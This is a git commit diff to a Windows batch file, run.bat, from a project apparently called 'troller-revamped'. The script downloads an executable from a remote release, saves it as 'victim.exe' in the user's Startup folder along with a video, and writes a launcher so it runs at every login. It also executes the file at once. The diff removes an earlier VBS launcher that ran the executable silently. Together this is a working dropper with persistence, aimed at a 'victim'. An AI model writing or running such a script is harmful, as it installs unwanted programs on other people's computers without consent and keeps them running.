cc36612f24fa1ddbe16d80421d97011ef7eaca61
vexnity <159264249+vexnity@users.noreply.github.com>
2024-06-18 20:36:49 +0530

    Update run.bat

--- run.bat
+++ run.bat
@@ -3,11 +3,13 @@ set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 
 :: download the executable and the video file
 curl -L "https://github.com/vexnity/troller-revamped/releases/download/Release/troller.exe" -o "%STARTUP_FOLDER%\victim.exe"
-curl "https://github.com/vexnity/troller-revamped/raw/main/troll%20in%20suit.mp4" -o "%STARTUP_FOLDER%\test.mp4"
+curl "https://raw.githubusercontent.com/vexnity/troller-revamped/preview/test.mp4" -o "%STARTUP_FOLDER%\test.mp4"
 
-:: create a vbs file to run the executable silently
-echo Set WshShell = CreateObject("WScript.Shell") > "%STARTUP_FOLDER%\run_victim.vbs"
-echo WshShell.Run chr(34) ^& "%STARTUP_FOLDER%\victim.exe" ^& Chr(34), 0 >> "%STARTUP_FOLDER%\run_victim.vbs"
-echo Set WshShell = Nothing >> "%STARTUP_FOLDER%\run_victim.vbs"
+:: create a batch file to run the executable at startup
+echo @echo off > "%STARTUP_FOLDER%\run_victim.bat"
+echo start "" "%STARTUP_FOLDER%\victim.exe" >> "%STARTUP_FOLDER%\run_victim.bat"
 
-echo Files have been moved to startup folder.
+:: run the executable immediately
+start "" "%STARTUP_FOLDER%\victim.exe"
+
+echo Files have been moved to startup folder, set to run at startup, and executed.
